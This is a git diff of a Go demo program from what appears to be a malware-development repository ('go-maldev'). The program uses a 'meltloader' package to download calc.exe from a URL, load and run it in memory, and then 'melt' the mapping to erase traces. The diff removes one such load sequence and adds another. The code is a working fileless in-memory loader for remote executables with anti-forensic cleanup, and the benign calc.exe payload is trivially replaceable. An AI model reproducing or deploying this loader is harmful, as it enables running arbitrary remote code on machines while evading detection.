@@ -3,8 +3,9 @@ package main
 import (
 	"fmt"
 	"log"
-	"github.com/carved4/meltloader/pkg/pe"
 	"runtime/debug"
+
+	"github.com/carved4/meltloader/pkg/pe"
 )
 
 func main() {
@@ -29,7 +30,7 @@ func main() {
 	if err != nil {
 		fmt.Println("failed to melt dll after load:", err)
 	}
-	
+
 	// demonstrate they are no longer in our image and then close
 	fmt.Println("successfuly melted dll!")
 	baseAddrs, sizes, count = pe.GetMap()
@@ -37,15 +38,8 @@ func main() {
 	for i := 0; i < count; i++ {
 		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
 	}
-	// demonstrate pe loading with timer
-	peMapping, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
-	if err != nil {
-		fmt.Println("failed to load PE:", err)
-	} else {
-		fmt.Println("successfully loaded PE")
-	}
 	// demonstrate another pe load, should spawn two calcs by now then return to loader and print how many are mapped, then melt
-	peMapping2, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
+	peMapping2, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
 	if err != nil {
 		fmt.Println("failed to load PE:", err)
 	} else {
@@ -56,10 +50,6 @@ func main() {
 	fmt.Printf("currently have %d PEs mapped:\n", peCount)
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
-	}
-	err = pe.MeltPE(peMapping)
-	if err != nil {
-		fmt.Println("failed to melt PE after load:", err)
 	}
 	err = pe.MeltPE(peMapping2)
 	if err != nil {
@@ -72,4 +62,25 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
+	peMapping3, err := pe.LoadPEFromUrl("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
+	if err != nil {
+		fmt.Println("failed to load PE:", err)
+	} else {
+		fmt.Println("successfully loaded PE")
+	}
+	peBaseAddrs, peSizes, peCount = pe.GetPEMap()
+	fmt.Printf("currently have %d PEs mapped:\n", peCount)
+	for i := 0; i < peCount; i++ {
+		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
+	}
+	err = pe.MeltPE(peMapping3)
+	if err != nil {
+		fmt.Println("failed to melt PE after load:", err)
+	}
+	peBaseAddrs, peSizes, peCount = pe.GetPEMap()
+	fmt.Printf("currently have %d PEs mapped:\n", peCount)
+	for i := 0; i < peCount; i++ {
+		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
+	}
+
 }
